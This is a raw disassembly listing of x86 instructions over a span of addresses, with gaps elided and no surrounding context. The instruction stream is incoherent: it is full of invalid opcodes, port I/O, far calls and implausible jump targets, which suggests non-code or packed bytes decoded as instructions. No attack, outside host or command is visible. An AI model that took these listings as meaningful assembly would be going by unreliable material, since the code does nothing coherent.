  4289f6:	sar    DWORD PTR [edx],1
  4289f8:	in     eax,dx
  4289f9:	dec    esp
  4289fa:	jle    0x4289a8
  4289fc:	das    
  4289fd:	int3   
  4289fe:	(bad)  
  4289ff:	dec    DWORD PTR [ecx]
  428a01:	sbb    eax,0xa4f353d3
  428a06:	xchg   esp,eax
  428a07:	push   ss
  428a08:	aas    
  428a09:	xor    BYTE PTR [ecx+edx*2],cl
  428a0c:	fstp   QWORD PTR [eax*4-0x791b42ba]
  428a13:	jae    0x4289f1
  428a15:	test   BYTE PTR [ebp+ebp*2-0x73],ah
  428a19:	mov    esi,DWORD PTR fs:[eax+ecx*2+0x349b9141]
  428a21:	ins    DWORD PTR es:[edi],dx
  428a22:	adc    al,BYTE PTR [ebx+0x78]
  428a25:	or     bl,BYTE PTR [esi]
  428a27:	loope  0x428a18
  428a29:	mov    ch,0x5f
  428a2b:	xor    bh,BYTE PTR ds:0xdecbe2f0
  428a31:	dec    esi
  428a32:	mov    esp,0x2a3daf2
  428a37:	loop   0x428a66
  428a39:	imul   eax,DWORD PTR [esi-0x75],0x7f
  428a3d:	mov    ch,0x3d
  428a3f:	call   0x42a03c
	...
  428ab4:	retf   0x528b
  428ab7:	jnp    0x428b0c
  428ab9:	sti    
  428aba:	jmp    0x428a77
  428abc:	xchg   ebp,eax
  428abd:	sub    eax,0x5a5f691
  428ac2:	shl    DWORD PTR [ecx+0x1b04e],cl
  428ac8:	test   BYTE PTR [eax],0x0
  428acb:	add    al,ch
  428acd:	jb     0x428b06
  428acf:	jg     0x428af1
  428ad1:	mov    ebp,0x2154d986
  428ad6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428ad7:	ds (bad) 
  428ad9:	ins    DWORD PTR es:[edi],dx
  428ada:	mov    esp,0x3b9bd582
  428adf:	sbb    eax,0xf18dc792
  428ae4:	cmp    bl,0xc2
  428ae7:	dec    ecx
  428ae8:	sahf   
  428ae9:	mov    WORD PTR [eax+0x32],cs
  428aec:	sti    
  428aed:	inc    edi
  428aee:	cmp    DWORD PTR [eax+eiz*2-0x3bb1dd1d],ebp
  428af5:	aaa    
  428af6:	xchg   esi,eax
  428af7:	xor    BYTE PTR [esi+0x90e8408],ah
  428afd:	das    
  428afe:	sub    al,0x31
  428b00:	and    ah,dh
  428b02:	das    
  428b03:	rcl    BYTE PTR [eax-0x71334816],cl
  428b09:	or     al,0x23
  428b0b:	xchg   DWORD PTR [ebx+0x20],ebx
  428b0e:	dec    ebx
  428b0f:	fs xchg esi,eax
  428b11:	lds    ebp,FWORD PTR [ebx]
  428b13:	icebp  
  428b14:	mov    ebx,0xd734da7e
  428b19:	imul   DWORD PTR [esi+0x54fec694]
  428b1f:	dec    eax
  428b20:	aam    0xad
  428b22:	jle    0x428b9b
  428b24:	shl    DWORD PTR [esi-0x129c05cb],cl
  428b2a:	mov    esi,0x95d737a5
  428b2f:	push   0xffffffba
  428b31:	pop    ebp
  428b32:	aaa    
  428b33:	leave  
  428b34:	mov    esi,0x1bc1c6a5
  428b39:	lds    ebp,FWORD PTR [eax]
  428b3b:	repz xchg esi,eax
  428b3d:	mov    bl,0x64
  428b3f:	lahf   
  428b40:	loope  0x428b22
  428b42:	dec    edx
  428b43:	les    edx,FWORD PTR [edx+ebx*1]
  428b46:	and    al,0x98
  428b48:	or     BYTE PTR [edx],ch
  428b4a:	and    BYTE PTR ds:0x41dcd4cb,ch
  428b50:	sbb    al,0x7f
  428b52:	mov    esi,0xce2e8c0d
  428b57:	or     ebx,edx
  428b59:	bound  edi,QWORD PTR [edx]
  428b5b:	or     bh,BYTE PTR [edi-0x4e]
  428b5e:	aas    
  428b5f:	push   ss
  428b60:	jmp    DWORD PTR [si]
  428b63:	stc    
  428b64:	jl     0x428b68
  428b66:	mov    BYTE PTR [ebx],0xdf
  428b69:	into   
  428b6a:	pop    es
  428b6b:	push   edi
  428b6c:	mov    ebx,0xc96dd442
  428b71:	out    dx,eax
  428b72:	sbb    BYTE PTR [ebp+0x2e571d7f],0x20
  428b79:	xor    DWORD PTR [ebx-0x370c2c2],ecx
  428b7f:	mov    al,ds:0xb6ea7997
  428b84:	outs   dx,BYTE PTR ds:[esi]
  428b85:	test   DWORD PTR [eax],ebp
  428b87:	mov    edi,0xd3a51d99
  428b8c:	dec    edi
  428b8d:	xchg   ecx,eax
  428b8e:	or     al,0x80
  428b90:	iret   
  428b91:	ficom  DWORD PTR [ebx+0x26]
  428b94:	test   al,0xa3
  428b96:	aad    0x88
  428b98:	cmp    BYTE PTR [esi],0xc7
  428b9b:	enter  0x9a83,0x66
  428b9f:	hlt    
  428ba0:	scas   eax,DWORD PTR es:[edi]
  428ba1:	add    al,BYTE PTR [eax+edx*1]
  428ba4:	inc    esi
  428ba5:	pop    ss
  428ba6:	data16 (bad) 
  428ba8:	iret   
  428ba9:	js     0x428c0a
  428bab:	jne    0x428bcb
  428bad:	or     eax,DWORD PTR [edi]
  428baf:	xchg   DWORD PTR [ecx],ebp
  428bb1:	addr16 pushw ss
  428bb4:	jne    0x428b8b
  428bb6:	cmp    bl,bl
  428bb8:	ficom  WORD PTR [ebx]
  428bba:	pop    ecx
  428bbb:	cmp    al,0x9d
  428bbd:	mov    dl,dl
  428bbf:	jbe    0x428b46
  428bc1:	pop    ebp
	...
  428c32:	add    BYTE PTR [eax],al
  428c34:	mov    ds:0xf343b050,eax
  428c39:	jecxz  0x428c2e
  428c3b:	lock mov ebx,0x66d7a28f
  428c41:	jae    0x428bc9
  428c43:	pop    esp
  428c44:	inc    esp
  428c45:	mov    cl,0x1
  428c47:	add    dh,dh
  428c49:	add    BYTE PTR [eax],al
  428c4b:	add    ah,dl
  428c4d:	xchg   DWORD PTR ds:0xad15896f,ebp
  428c53:	push   edi
  428c54:	xchg   ecx,eax
  428c55:	dec    ecx
  428c56:	sbb    DWORD PTR [edx],ecx
  428c58:	push   edx
  428c59:	(bad)  
  428c5a:	pushf  
  428c5b:	fdivr  QWORD PTR [esi+eiz*2-0x11ed0a0]
  428c62:	push   ebp
  428c63:	cmp    al,al
  428c65:	iret   
  428c66:	push   0x40b4813b
  428c6b:	rcl    DWORD PTR [eax],0xa5
  428c6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428c6f:	push   ebp
  428c70:	std    
  428c71:	push   ss
  428c72:	mov    dl,BYTE PTR es:[eax]
  428c75:	ss test eax,0xdfb121f0
  428c7b:	fnstcw WORD PTR [ebp-0x71]
  428c7e:	jp     0x428cce
  428c80:	retf   0x6875
  428c83:	or     eax,0xb1cef834
  428c88:	jo     0x428c62
  428c8a:	add    ebp,ecx
  428c8c:	out    dx,al
  428c8d:	cli    
  428c8e:	xor    ecx,DWORD PTR [edx-0x6518de9f]
  428c94:	ins    DWORD PTR es:[edi],dx
  428c95:	int3   
  428c96:	or     al,0x45
  428c98:	jbe    0x428cbf
  428c9a:	inc    esp
  428c9b:	rcr    BYTE PTR [eax],1
  428c9d:	jg     0x428c69
  428c9f:	aad    0x10
  428ca1:	dec    esp
  428ca2:	mov    WORD PTR [edx],?
  428ca4:	mov    cl,0xba
  428ca6:	sbb    BYTE PTR [ecx+0x4e],ch
  428ca9:	jbe    0x428c51
  428cab:	int    0x6d
  428cad:	call   DWORD PTR [edx]
  428caf:	out    dx,eax
  428cb0:	xchg   DWORD PTR ss:[edx+ebx*8+0x71],ebp
  428cb5:	sbb    DWORD PTR [ebx-0x6e2eac1d],0x9fbd568
  428cbf:	xor    BYTE PTR [edi+edi*4],dh
  428cc2:	ror    DWORD PTR ds:0x2ed2c21b,1
  428cc8:	inc    ebp
  428cc9:	retf   0xd24c
  428ccc:	repnz mov ah,0x8e
  428ccf:	in     eax,0xc1
  428cd1:	dec    esi
  428cd2:	mov    dh,0x21
  428cd4:	and    edx,DWORD PTR [ecx-0x36]
  428cd7:	jo     0x428d23
  428cd9:	and    al,0x91
  428cdb:	js     0x428d2f
  428cdd:	push   ecx
  428cde:	xchg   ebp,eax
  428cdf:	xor    dl,BYTE PTR [edx+0x6a]
  428ce2:	add    al,0xf3
  428ce4:	ins    BYTE PTR es:[edi],dx
  428ce5:	shl    edi,0xb2
  428ce8:	das    
  428ce9:	cmp    eax,0xee762662
  428cee:	mov    ah,0xf4
  428cf0:	fpatan 
  428cf2:	and    al,0x85
  428cf4:	fimul  WORD PTR [ebx+0x388ac2a1]
  428cfa:	shl    BYTE PTR [ecx-0x30edcc34],1
  428d00:	fwait
  428d01:	xlat   BYTE PTR ds:[ebx]
  428d02:	sti    
  428d03:	mov    al,ds:0x796a03f9
  428d08:	sub    eax,0x6cba90ca
  428d0d:	cmp    al,0xe4
  428d0f:	jmp    0x428ca3
  428d11:	lds    ebp,FWORD PTR [edx-0x69e77966]
  428d17:	loope  0x428cf0
  428d19:	add    DWORD PTR [edx],ebp
  428d1b:	fdivp  st(6),st
  428d1d:	adc    DWORD PTR [edi-0x1c2e5910],ebx
  428d23:	push   0x16c5631
  428d28:	int    0x88
  428d2a:	repnz cmc 
  428d2c:	lods   al,BYTE PTR ds:[esi]
  428d2d:	push   es
  428d2e:	xchg   ecx,eax
  428d2f:	xor    ecx,DWORD PTR [ecx]
  428d31:	mov    ebp,ebp
  428d33:	dec    eax
  428d34:	xchg   ebx,eax
  428d35:	and    eax,0xccfbeae0
  428d3a:	mov    dh,BYTE PTR [ebx]
  428d3c:	and    al,0x10
  428d3e:	daa    
  428d3f:	push   0xffffff83
  428d41:	sub    al,0x0
	...
  428db3:	add    BYTE PTR [eax+0x6d3c25f1],bh
  428db9:	cld    
  428dba:	mov    ecx,0x195a21f5
  428dbf:	test   eax,0x2b97c346
  428dc4:	cmp    dh,BYTE PTR [edx+0xf60001]
  428dca:	add    BYTE PTR [eax],al
  428dcc:	mov    ah,dl
  428dce:	pop    edi
  428dcf:	fwait
  428dd0:	push   ebx
  428dd1:	popa   
  428dd2:	hlt    
  428dd3:	jbe    0x428e1e
  428dd5:	inc    edi
  428dd6:	lds    eax,FWORD PTR [eax]
  428dd8:	mov    ah,0xd2
  428dda:	mov    esp,0x6c554bcd
  428ddf:	pop    ecx
  428de0:	popa   
  428de1:	(bad)  [ebx+0x65]
  428de4:	bound  ebp,QWORD PTR [eax]
  428de6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428de7:	mov    ecx,0x322a1cd3
  428dec:	retf   0x11e9
  428def:	arpl   dx,ax
  428df1:	bound  esi,QWORD PTR [ecx]
  428df3:	push   ecx
  428df4:	xor    eax,0x6cc90c0b
  428df9:	adc    esp,ecx
  428dfb:	mov    DWORD PTR [eax-0x51321684],eax
  428e01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428e02:	sti    
  428e03:	mov    dl,0x15
  428e05:	pop    eax
  428e06:	dec    ebp
  428e07:	test   DWORD PTR [ecx-0x64b7deae],eax
  428e0d:	or     al,0x72
  428e0f:	or     edx,esi
  428e11:	dec    edx
  428e12:	jecxz  0x428e81
  428e14:	adc    eax,0x68298495
  428e19:	sub    al,0x94
  428e1b:	lods   al,BYTE PTR ds:[esi]
  428e1c:	mov    eax,0x84303cee
  428e21:	pop    ecx
  428e22:	push   ebx
  428e23:	cs cmp eax,0xa157ea56
  428e29:	or     al,0xea
  428e2b:	fbld   TBYTE PTR [edx+edi*8-0x111a023]
  428e32:	les    esp,FWORD PTR [ecx+0x3]
  428e35:	and    ebx,DWORD PTR [edx-0x6fa2a779]
  428e3b:	or     dh,dl
  428e3d:	jbe    0x428e16
  428e3f:	pop    esi
  428e40:	mov    bh,0xb6
  428e42:	mov    ebp,esi
  428e44:	cmp    al,BYTE PTR [edi-0x7f]
  428e47:	xchg   ecx,eax
  428e48:	fbstp  TBYTE PTR ds:0x1cd7d355
  428e4e:	mov    ecx,0x463d9e70
  428e53:	jmp    0x37a78f42
  428e58:	sub    eax,0x3686196a
  428e5d:	inc    eax
  428e5e:	sbb    DWORD PTR [ebx],eax
  428e60:	sbb    dl,BYTE PTR [eax]
  428e62:	jae    0x428edc
  428e64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428e65:	xor    eax,0x801de2d0
  428e6a:	fldenv [eax-0x675f2a8a]
  428e70:	das    
  428e71:	mov    DWORD PTR [ebx],eax
  428e73:	xchg   ebp,eax
  428e74:	imul   edi,DWORD PTR [ecx+0x5a],0x78
  428e78:	pop    ss
  428e79:	mov    cl,0x51
  428e7b:	rol    DWORD PTR [esi-0x46e42af1],1
  428e81:	out    dx,al
  428e82:	cdq    
  428e83:	push   0xe4a6fe83
  428e88:	ins    DWORD PTR es:[edi],dx
  428e89:	aas    
  428e8a:	adc    ebx,ebx
  428e8c:	push   ds
  428e8d:	push   es
  428e8e:	push   ds
  428e8f:	xchg   ecx,eax
  428e90:	xchg   edi,eax
  428e91:	data16 cli 
  428e93:	cwde   
  428e94:	in     eax,dx
  428e95:	in     al,0xd
  428e97:	mov    al,ds:0x24c7a57
  428e9c:	ret    0x5ce0
  428e9f:	push   0xffffffb2
  428ea1:	xchg   ebx,eax
  428ea2:	stc    
  428ea3:	xchg   ecx,eax
  428ea4:	adc    DWORD PTR [edx-0x4b],esp
  428ea7:	lds    ebx,FWORD PTR [esi-0x34]
  428eaa:	clc    
  428eab:	daa    
  428eac:	outs   dx,DWORD PTR ds:[esi]
  428ead:	sub    eax,0x6898ef13
  428eb2:	retf   
  428eb3:	jae    0x428f1a
  428eb5:	xchg   esi,eax
  428eb6:	(bad)  
  428eb7:	cli    
  428eb8:	arpl   WORD PTR [ebx-0x3812290b],cx
  428ebe:	lds    edx,FWORD PTR [ecx]
  428ec0:	es sbb al,0x0
	...
  428f33:	add    BYTE PTR [ecx+0x5f2f4ba7],dh
  428f39:	out    dx,eax
  428f3a:	cmc    
  428f3b:	mov    edi,0x37e5e17c
  428f40:	push   ds
  428f41:	pop    ecx
  428f42:	and    edi,DWORD PTR [edx+0x1b330]
  428f48:	test   BYTE PTR [eax],0x0
  428f4b:	add    BYTE PTR [edx-0x4f5f0945],al
  428f51:	in     eax,dx
  428f52:	out    0x2d,eax
  428f54:	mov    ebx,0x18216914
  428f59:	pop    ebx
  428f5a:	mov    ch,0x49
  428f5c:	mov    BYTE PTR [ebx+0x609074f8],0xee
  428f63:	pop    es
  428f64:	fistp  WORD PTR [ecx]
  428f66:	int3   
  428f67:	push   0x68
  428f69:	fdivr  DWORD PTR [edi-0x267ab95]
  428f6f:	fmul   QWORD PTR [ecx]
  428f71:	test   DWORD PTR [ebp+0x7d312166],ebx
  428f77:	jg     0x428fbd
  428f79:	sub    BYTE PTR [ecx-0x708765f6],al
  428f7f:	mov    DWORD PTR [ebx+0x507eac90],ecx
  428f85:	adc    al,0xc2
  428f87:	addr16 push eax
  428f89:	xor    DWORD PTR [ebp+ebx*8-0x6fa9424e],ebp
  428f90:	outs   dx,DWORD PTR ds:[esi]
  428f91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428f92:	pop    ds
  428f93:	inc    ebx
  428f94:	xchg   edx,eax
  428f95:	push   edx
  428f96:	xchg   esi,eax
  428f97:	ins    BYTE PTR es:[edi],dx
  428f98:	cmp    eax,0xa5ad6e40
  428f9d:	dec    eax
  428f9e:	sub    ecx,ecx
  428fa0:	dec    ecx
  428fa1:	mov    edi,0xb9f97601
  428fa6:	nop
  428fa7:	push   edx
  428fa8:	js     0x428f4f
  428faa:	jae    0x429020
  428fac:	mov    DWORD PTR ds:[edx-0x73],eax
  428fb0:	dec    edx
  428fb1:	push   ebp
  428fb2:	outs   dx,BYTE PTR ds:[esi]
  428fb3:	stc    
  428fb4:	xchg   BYTE PTR [esi-0x5e60c408],dh
  428fba:	lds    edi,FWORD PTR ds:[edi+0x26dc4c09]
  428fc1:	addr16 leave 
  428fc3:	mov    dh,0xc1
  428fc5:	xchg   ebp,eax
  428fc6:	push   ss
  428fc7:	inc    ebp
  428fc8:	mov    al,ds:0x9667161c
  428fcd:	in     eax,0x4b
  428fcf:	mov    fs,WORD PTR [ecx-0x1d059dfa]
  428fd5:	lds    edi,FWORD PTR [esi+0x7aea9e34]
  428fdb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428fdc:	fisub  WORD PTR [ebx+0x56]
  428fdf:	jmp    0x7f2e6ccb
  428fe4:	sbb    BYTE PTR [edx],bl
  428fe6:	bound  edx,QWORD PTR [eax]
  428fe8:	dec    ecx
  428fe9:	dec    ebx
  428fea:	push   esi
  428feb:	pop    esi
  428fec:	in     eax,0x54
  428fee:	stc    
  428fef:	xchg   ebx,eax
  428ff0:	xor    ebp,0x39
  428ff3:	pop    esp
  428ff4:	pop    eax
  428ff5:	push   0x10
  428ff7:	mov    ds,WORD PTR gs:[edi-0x40]
  428ffb:	jl     0x428fa6
  428ffd:	stos   BYTE PTR es:[edi],al
  428ffe:	and    eax,0x2b7820ec
  429003:	adc    al,0x13
  429005:	mov    ebp,DWORD PTR [eax+ebx*2]
  429008:	adc    eax,0xc178b6a7
  42900d:	cli    
  42900e:	xor    dh,BYTE PTR [ebp+0x6daec172]
  429014:	lds    edi,FWORD PTR [ecx-0x79db2150]
  42901a:	add    eax,0xee9e8195
  42901f:	jecxz  0x42906d
  429021:	sub    al,0x6
  429023:	cmp    bl,BYTE PTR [ecx-0x794b4dbb]
  429029:	ss test eax,0x858ba387
  42902f:	loopne 0x4290a8
  429031:	fistp  WORD PTR [ecx+0x50a22d42]
  429037:	out    0x90,al
  429039:	mov    ds:0x50adb9e,al
  42903e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42903f:	add    al,0x57
  429041:	lds    eax,FWORD PTR [eax]
	...
  4290b3:	add    bh,bl
  4290b5:	out    dx,al
  4290b6:	std    
  4290b7:	dec    esp
  4290b8:	std    
  4290b9:	pop    edi
  4290ba:	(bad)  
  4290bb:	(bad)  
  4290bc:	mov    edi,0x75b66cf7
  4290c1:	arpl   WORD PTR [ecx+0x1b42630],di
  4290c7:	add    dh,dh
  4290c9:	add    BYTE PTR [eax],al
  4290cb:	add    BYTE PTR [ecx-0x1f294d5b],bh
  4290d1:	inc    edx
  4290d2:	inc    esi
  4290d3:	adc    eax,0xdd77dc22
  4290d8:	and    edi,ebp
  4290da:	pop    ds
  4290db:	mov    ecx,0xa454fdb2
  4290e0:	std    
  4290e1:	mov    ebx,0xd9133e9e
  4290e6:	mov    cl,0x63
  4290e8:	push   0x5f
  4290ea:	aad    0x2e
  4290ec:	adc    BYTE PTR [ebx-0x25326c0f],ah
  4290f2:	sub    dl,BYTE PTR [edx-0x53b6f7d0]
  4290f8:	xchg   ebp,eax
  4290f9:	rol    DWORD PTR [edx],0x0
  4290fc:	les    esp,FWORD PTR [edx-0x7acedad4]
  429102:	mov    ebx,0xf690796d
  429107:	(bad)  
  429108:	idiv   cl
  42910a:	ret    
  42910b:	imul   esi,ebx,0x10
  42910e:	mov    ds:0x5e5b0439,al
  429113:	cmp    ch,al
  429115:	lock sbb al,0x6c
  429118:	scas   al,BYTE PTR es:[edi]
  429119:	dec    esp
  42911a:	add    al,0xfb
  42911c:	or     al,BYTE PTR [ecx]
  42911e:	push   ecx
  42911f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429120:	call   FWORD PTR [ebx-0x6d61c5cb]
  429126:	jmp    ebp
  429128:	pop    ebx
  429129:	xor    al,0x38
  42912b:	scas   eax,DWORD PTR es:[edi]
  42912c:	xor    eax,0x489150d
  429131:	mov    esp,0x32fb7476
  429136:	dec    eax
  429137:	call   0xfd81:0xebe430b0
  42913e:	mov    ebx,0x1d6b6568
  429143:	stos   DWORD PTR es:[edi],eax
  429144:	mov    DWORD PTR [ebp-0x77],edi
  429147:	mov    ch,0xc5
  429149:	aam    0x95
  42914b:	out    0x81,eax
  42914d:	mov    es,WORD PTR [eax+0x19]
  429150:	out    dx,al
  429151:	adc    eax,0xdfc0b602
  429156:	dec    edx
  429157:	or     ecx,DWORD PTR [edx-0x13]
  42915a:	loope  0x429100
  42915c:	jl     0x429159
  42915e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42915f:	and    esi,ecx
  429161:	inc    esp
  429162:	(bad)  
  429163:	clc    
  429164:	mov    ds:0xf7844ce8,eax
  429169:	les    esi,FWORD PTR [ebx-0x5613fc3e]
  42916f:	mov    bl,0xee
  429171:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429172:	mov    ch,0x79
  429174:	cmp    DWORD PTR [eax-0x11110827],edi
  42917a:	push   ebx
  42917b:	push   ebx
  42917c:	cmp    al,0x4
  42917e:	stc    
  42917f:	or     dh,ch
  429181:	in     eax,0xc9
  429183:	mov    al,ds:0x945c78d3
  429188:	cmc    
  429189:	xchg   edx,eax
  42918a:	dec    edx
  42918b:	ins    DWORD PTR es:[edi],dx
  42918c:	or     ecx,esp
  42918e:	mov    eax,ds:0x5a1c5394
  429193:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429194:	(bad)  
  429195:	push   0x5275b869
  42919a:	dec    esp
  42919c:	imul   ebx,ebx,0x21ccc92d
  4291a2:	ret    
  4291a3:	es addr16 push es
  4291a6:	(bad)  
  4291a7:	or     eax,0x51329afb
  4291ac:	retf   0x2d32
  4291af:	xchg   esi,eax
  4291b0:	test   DWORD PTR [edi+0x16],esi
  4291b3:	sub    ebx,ecx
  4291b5:	es call 0x7783:0xd7df796f
  4291bd:	das    
  4291be:	mov    ch,0xb
  4291c0:	(bad)  
  4291c1:	loop   0x4291c3
	...
  429233:	add    bh,al
  429235:	fidiv  WORD PTR [esi]
  429237:	loop   0x429278
  429239:	jmp    0x67eb:0x13f5ffd7
  429240:	mov    BYTE PTR [ebp-0x31],bh
  429243:	mov    dh,0x1c
  429245:	mov    ch,0x1
  429247:	add    dh,dh
  429249:	add    BYTE PTR [eax],al
  42924b:	add    bh,bh
  42924d:	fmul   QWORD PTR [ebx]
  42924f:	mov    dl,0x33
  429251:	xor    ah,BYTE PTR [edi]
  429253:	or     ebx,edi
  429255:	nop
  429256:	aam    0xe6
  429258:	iret   
  429259:	cld    
  42925a:	in     eax,dx
  42925b:	mov    bh,0x8a
  42925d:	jecxz  0x42927e
  42925f:	dec    edi
  429260:	clc    
  429261:	and    ebx,DWORD PTR [ecx-0x4b]
  429264:	addr16 jbe 0x4292d0
  429267:	fwait
  429268:	bound  esi,QWORD PTR [ebx]
  42926a:	cwde   
  42926b:	jp     0x4292cf
  42926d:	push   cs
  42926e:	lahf   
  42926f:	and    ebx,DWORD PTR [ebx+0x6030a9aa]
  429275:	sub    eax,edx
  429277:	(bad)  
  429278:	loop   0x4292cd
  42927a:	inc    ecx
  42927b:	sti    
  42927c:	mov    eax,0x19f79ea9
  429281:	dec    esi
  429282:	and    eax,0x6272da0d
  429287:	out    dx,al
  429288:	xchg   BYTE PTR [eax-0x7bfbabef],bh
  42928e:	pop    ds
  42928f:	dec    esp
  429290:	pusha  
  429291:	inc    esi
  429292:	cs jge 0x429261
  429295:	and    ecx,0xf96a1510
  42929b:	xlat   BYTE PTR ds:[ebx]
  42929c:	push   ecx
  42929d:	lods   eax,DWORD PTR ds:[esi]
  42929e:	and    eax,0xe64ec6dd
  4292a3:	sbb    bh,BYTE PTR [edx+0x188610eb]
  4292a9:	leave  
  4292aa:	popf   
  4292ab:	shl    DWORD PTR [eax-0x17],cl
  4292ae:	daa    
  4292af:	sbb    dh,BYTE PTR [esi-0x76a8d4ce]
  4292b5:	sbb    dl,BYTE PTR [edx-0x57]
  4292b8:	push   esi
  4292b9:	out    0xc7,eax
  4292bb:	adc    ebx,DWORD PTR [edx]
  4292bd:	in     al,0x18
  4292bf:	jl     0x42924f
  4292c1:	repz cmp al,0x60
  4292c4:	sub    BYTE PTR [edx-0x6f],al
  4292c7:	cli    
  4292c8:	dec    eax
  4292c9:	add    BYTE PTR [esi],cl
  4292cb:	pop    gs
  4292cd:	hlt    
  4292ce:	add    DWORD PTR [ebp-0x6f7f372f],edi
  4292d4:	inc    eax
  4292d5:	js     0x429321
  4292d7:	icebp  
  4292d8:	sub    DWORD PTR [edi+0xfbe3c4a],esp
  4292de:	pushf  
  4292df:	xchg   DWORD PTR [eax+0x3c993b6d],edi
  4292e5:	xlat   BYTE PTR ds:[ebx]
  4292e6:	cmp    DWORD PTR [ecx+0x1f4c6a9d],0x50cabbd6
  4292f0:	mov    al,0x9b
  4292f2:	add    eax,eax
  4292f4:	int3   
  4292f5:	loop   0x4292e8
  4292f7:	out    dx,eax
  4292f8:	push   es
  4292f9:	ja     0x4292de
  4292fb:	repnz dec edi
  4292fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4292fe:	ja     0x429371
  429300:	fs sbb eax,0x109b88fd
  429306:	mov    WORD PTR ss:[ebx],fs
  429309:	out    0x48,al
  42930b:	push   ecx
  42930c:	mov    cs,WORD PTR [ebx]
  42930e:	jae    0x429384
  429310:	mov    DWORD PTR [ebp+0x32],eax
  429313:	mov    ah,0xdf
  429315:	mov    ebx,DWORD PTR [edx+0x2a076bc5]
  42931b:	jae    0x4292da
  42931d:	leave  
  42931e:	pop    ebx
  42931f:	mul    DWORD PTR [esi]
  429321:	add    BYTE PTR [edi-0x42],al
  429324:	push   esi
  429325:	pop    ds
  429326:	add    esi,DWORD PTR [ebp+0x6d]
  429329:	rol    ebx,cl
  42932b:	rol    dl,0x8b
  42932e:	call   0x3c28:0x600fd733
  429335:	mul    al
  429337:	sbb    al,0x76
  429339:	pop    es
  42933a:	call   0x36c7:0x950cd98d
  429341:	jo     0x429343
	...
  4293b3:	add    BYTE PTR [esi],cl
  4293b5:	xchg   esp,eax
  4293b6:	jg     0x42941b
  4293b8:	(bad)  
  4293b9:	jmp    0x4293d9
  4293bb:	std    
  4293bc:	jge    0x4293da
  4293be:	in     al,dx
  4293bf:	xchg   edi,eax
  4293c0:	loopne 0x4293d7
  4293c2:	popa   
  4293c3:	(bad)  
  4293c4:	adc    dh,BYTE PTR [esi+0xf60001]
  4293ca:	add    BYTE PTR [eax],al
  4293cc:	inc    ebp
  4293cd:	jne    0x4293be
  4293cf:	pop    es
  4293d0:	xchg   esp,eax
  4293d1:	jne    0x429431
  4293d3:	sahf   
  4293d4:	in     eax,dx
  4293d5:	and    eax,0xdb6ab3da
  4293da:	cmp    edx,DWORD PTR [edx+0x44be2d44]
  4293e0:	je     0x429461
  4293e2:	call   0xa12c:0x125fe716
  4293e9:	fiadd  DWORD PTR [ecx]
  4293eb:	sbb    esp,DWORD PTR [ecx]
  4293ed:	rcl    cl,0x45
  4293f0:	mov    es,WORD PTR ds:0x7e34c54d
  4293f6:	shl    ah,0xbe
  4293f9:	push   eax
  4293fa:	add    DWORD PTR [edx-0xa],ebp
  4293fd:	xchg   esi,eax
  4293fe:	stc    
  4293ff:	popa   
  429400:	pop    esi
  429401:	inc    ebp
  429402:	adc    al,0xb
  429404:	cmp    eax,0x4818e95e
  429409:	lock xor dh,dh
  42940c:	xchg   edi,eax
  42940d:	dec    eax
  42940e:	xchg   ebx,eax
  42940f:	adc    esp,DWORD PTR [ecx-0x26]
  429412:	and    edx,ebx
  429414:	test   ecx,0xe3c1b45a
  42941a:	jae    0x42942b
  42941c:	xor    BYTE PTR [ecx+0x591dfde5],al
  429422:	push   ds
  429423:	loope  0x42949e
  429425:	xchg   esi,eax
  429426:	out    dx,al
  429427:	in     al,0x98
  429429:	inc    ecx
  42942a:	fisubr WORD PTR [edx]
  42942c:	cmp    al,0x7a
  42942e:	add    dh,cl
  429430:	cli    
  429431:	rol    DWORD PTR [ebp-0x37],0xfe
  429435:	mov    dh,0x67
  429437:	mov    ch,0x30
  429439:	js     0x429461
  42943b:	jge    0x429401
  42943d:	shl    al,1
  42943f:	(bad)
  429443:	imul   edi,DWORD PTR [eax+0x248fc2a4],0xffffffb0
  42944a:	lea    esi,[esi]
  42944c:	lock inc ebx
  42944e:	je     0x4293d2
  429450:	stos   DWORD PTR es:[edi],eax
  429451:	pusha  
  429452:	add    al,al
  429454:	mov    ecx,0xab4d8887
  429459:	aaa    
  42945a:	push   esp
  42945b:	and    edx,DWORD PTR [edi-0x5f]
  42945e:	(bad)  
  42945f:	mov    ah,0x80
  429461:	cld    
  429462:	xchg   ebp,eax
  429463:	dec    esp
  429464:	shl    BYTE PTR [eax+0x4549aab6],1
  42946a:	xor    DWORD PTR [ecx+ecx*2],esp
  42946d:	fnsave [edi-0x120b2269]
  429473:	lds    edi,FWORD PTR [edx+0x17]
  429476:	cmp    dl,BYTE PTR [ebx-0x38]
  429479:	mov    edx,0x4757df5a
  42947e:	cli    
  42947f:	(bad)  
  429480:	test   al,0xf2
  429482:	repz xor eax,0xf221be14
  429488:	icebp  
  429489:	inc    ebp
  42948a:	cmp    al,0x56
  42948c:	mov    ch,0xbb
  42948e:	or     DWORD PTR [ebx-0x1a],0xcf69faf1
  429495:	pop    ds
  429496:	out    dx,al
  429497:	lea    eax,[eax*2+0x139922e1]
  42949e:	pusha  
  42949f:	cdq    
  4294a0:	jmp    0xcd4862db
  4294a5:	jo     0x429507
  4294a7:	cli    
  4294a8:	sub    ch,BYTE PTR [ecx+0x15b296c6]
  4294ae:	dec    edx
  4294af:	hlt    
  4294b0:	jle    0x429456
  4294b2:	into   
  4294b3:	je     0x429482
  4294b5:	jmp    0x271e4857
  4294ba:	add    al,al
  4294bc:	inc    esi
  4294bd:	imul   esi,ecx,0xf8055e
	...
  429533:	add    BYTE PTR [ecx-0xa],dl
  429536:	xor    eax,0x5bffb73e
  42953b:	(bad)  
  42953c:	std    
  42953d:	cmp    eax,0xcacfc4f3
  429542:	cmc    
  429543:	popa   
  429544:	or     BYTE PTR [edi+0xf60001],dh
  42954a:	add    BYTE PTR [eax],al
  42954c:	cdq    
